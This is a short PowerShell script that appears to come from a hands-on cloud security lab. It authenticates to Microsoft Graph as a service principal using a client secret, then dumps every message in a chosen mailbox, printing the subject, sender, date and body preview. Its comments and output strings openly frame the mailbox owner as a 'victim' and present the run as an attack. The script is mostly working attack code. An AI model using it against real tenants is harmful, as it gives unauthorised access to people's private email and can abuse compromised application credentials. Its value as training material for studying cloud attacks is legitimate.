## This will authenticate to a SPN and search for a given email
## Note, you will need Microsoft Graph PS module installed
# import modules
Import-Module Microsoft.Graph.Mail

# Variables - replace these with your actual details
$tenantId = "X"
$clientId = "X"
$clientSecret = "X"
$userPrincipalName = "X" # Mailbox to search


# Authentication
# https://learn.microsoft.com/en-us/powershell/microsoftgraph/authentication-commands?view=graph-powershell-1.0#use-delegated-access-with-a-custom-application-for-microsoft-graph-powershell
$ClientSecretCredential = Get-Credential -Credential "$clientid"
## Enter clientsecret for "HandsOnSPN" in the password prompt.
Connect-MgGraph -TenantId "$tenantid" -ClientSecretCredential $ClientSecretCredential
Write-output "________-_-_-Welcome Friend! See your identity's details below!-_-_-_______________"
get-MGContext


# Search Emails
## Display the contents of victim's mail items
## https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.mail/get-mgusermessage
## you can filter get-mgusermessage output, check mail schema https://learn.microsoft.com/en-us/graph/search-concept-messages
write-output "----------AYYYY LMAO printing vitctim's emails-------------"
$mails = Get-MgUserMessage -UserId $userPrincipalName -all
foreach ($mail in $mails) {
    Write-Output "Subject: $($mail.Subject)"
    Write-Output "From: $($mail.From.EmailAddress.Address)"
    Write-Output "Received: $($mail.ReceivedDateTime)"
    Write-Output "Body: $($mail.BodyPreview)"
    Write-Output "---------------------------"
}
write-output "----------end of vitctim's emails-------------"